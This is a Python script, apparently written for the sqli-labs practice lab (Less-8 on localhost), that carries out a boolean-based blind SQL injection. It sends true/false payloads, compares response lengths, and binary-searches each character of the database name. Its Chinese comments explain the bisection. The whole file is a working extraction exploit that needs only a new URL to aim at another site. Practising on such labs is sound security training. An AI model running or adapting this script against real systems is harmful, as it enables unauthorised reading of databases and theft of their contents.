import requests

URL="http://127.0.0.1/sqli-labs-master/Less-8/"
payload1="?id=1' and 1=1%23"
payload2="?id=1' and 1=2%23"
a=requests.get(URL+payload1)
b=requests.get(URL+payload2)

def boole(ml):
    r=requests.get(URL+f"?id=1' and {ml}%23")
    return len(r.text)==len(a.text)

def find_ascii(pos):
    # 维护一个区间 low~high，答案一定在这里面。每次砍掉一半。
    low=0
    high=127
    while low<high:
        mid=(low+high)//2
        if boole(f"ascii(substr(database(),{pos},1))>{mid}"):
            low=mid+1        # 大于 mid，答案在右半边
        else:
            high=mid         # 不大于 mid，答案在左半边（含 mid）
    return low               # low==high，就是答案

c=1
d=''
while c<9:
    e=find_ascii(c)
    d=d+chr(e)
    print(f"第{c}位 {chr(e)} = {e}    当前：{d}")
    c+=1

print("database=",d)
